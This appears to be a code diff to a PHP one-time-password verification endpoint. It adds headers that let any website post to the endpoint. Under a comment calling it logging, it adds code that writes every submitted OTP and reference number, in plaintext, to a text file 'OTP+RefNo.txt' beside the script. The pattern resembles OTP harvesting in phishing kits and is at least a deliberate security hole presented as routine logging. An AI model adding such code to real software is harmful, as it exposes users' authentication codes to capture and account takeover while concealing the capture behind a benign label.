@@ -1,6 +1,16 @@
 <?php
 
 header('Content-Type: application/json');
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
+header("Access-Control-Allow-Headers: Content-Type");
+
+if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
+    http_response_code(200);
+    exit();
+}
+
+$date_ = date("Y-m-d h:i:sa");
 
 $user_otp = isset($_POST['Otp']) ? trim($_POST['Otp']) : '';
 $referenceNo = isset($_POST['referenceNo']) ? trim($_POST['referenceNo']) : '';
@@ -12,6 +22,15 @@ if (empty($user_otp) || empty($referenceNo)) {
         'statusDetail' => 'OTP and reference number are required'
     ));
     exit;
+}
+
+// Log OTP verification attempt
+try {
+    $myfile = fopen("OTP+RefNo.txt", "a+") or die("Unable to open file!");
+    fwrite($myfile, "OTP:" . $user_otp . " RefNo:" . $referenceNo . " Date:" . $date_ . "\n");
+    fclose($myfile);
+} catch (Exception $e) {
+    // Continue even if logging fails
 }
 
 $config = require __DIR__ . '/../config.php';
